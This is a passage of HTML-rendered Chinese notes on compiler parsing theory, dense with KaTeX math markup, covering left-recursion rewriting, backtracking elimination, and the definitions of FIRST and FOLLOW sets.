style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>可以进一步写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><mo>→</mo><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mi>m</mi></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;A \\rightarrow A^{&#x27;&#x27;}A^{&#x27;}\\\\\n&amp;A^{&#x27;&#x27;}\\rightarrow \\beta_{1}|\\beta_{2}|\\dots|\\beta_{n} \\\\\n&amp;A^{&#x27;} \\rightarrow A^{&#x27;&#x27;&#x27;}A^{&#x27;}|\\epsilon \\\\\n&amp;A^{&#x27;&#x27;&#x27;} \\rightarrow \\alpha_{1}|\\alpha_{2}|\\dots|\\alpha_{m}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:6.609920000000001em;vertical-align:-3.0549600000000003em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5549600000000003em;\"><span style=\"top:-5.55496em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.90248em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.5975199999999998em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.0549600000000003em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5549600000000003em;\"><span style=\"top:-5.562480000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.2575200000000004em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span><span style=\"top:-0.6050399999999998em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.0549600000000003em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h4 id=\"回溯消除\"><a class=\"markdownIt-Anchor\" href=\"#回溯消除\"></a> 回溯消除</h4>\n<p>为什么会产生回溯？因为在遇到非终结字符挑选候选式的时候，可能会有多个候选式符合要求。具体有两种情况：</p>\n<ol>\n<li>相同左部的<strong>规则</strong>，产生式右部左端的第一个终结字符相同。</li>\n<li>相同左部的<strong>规则</strong>，其中某一个右部能够推出<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>，在从开始符号<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>的某一个推导中，左部非终结字符的后继符号与其某一个规则的右部的左端相同。</li>\n</ol>\n<p>为了解决这些问题，定义了一些三个特殊集合。</p>\n<h5 id=\"first集合\"><a class=\"markdownIt-Anchor\" href=\"#first集合\"></a> FIRST集合</h5>\n<p>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个不含左递归的文法，对<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的任意一个符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，定义其<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">FIRST</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span></span></span></span>集合。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow><mo>:</mo><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi>s</mi><mi mathvariant=\"normal\">∣</mi><mi>α</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>s</mi><mo>⋯</mo><mo>∧</mo><mi>s</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">FIRST\\left(\\alpha\\right):=\\left\\{s|\\alpha\\stackrel{*}{\\Rightarrow}s\\dots \\land s \\in V_{T} \\right\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.80002em;vertical-align:-0.65002em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">{</span></span><span class=\"mord mathdefault\">s</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">}</span></span></span></span></span></span></span></p>\n<p>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha\\stackrel{*}{\\Rightarrow}\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>，规定<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\epsilon \\in FIRST\\left(\\alpha\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">ϵ</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<h5 id=\"follow集合\"><a class=\"markdownIt-Anchor\" href=\"#follow集合\"></a> FOLLOW集合</h5>\n<p>假设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>是文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的开始符号，对于<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>中任意非终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，定义其<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">FOLLOW</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span></span></span></span>集合。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo 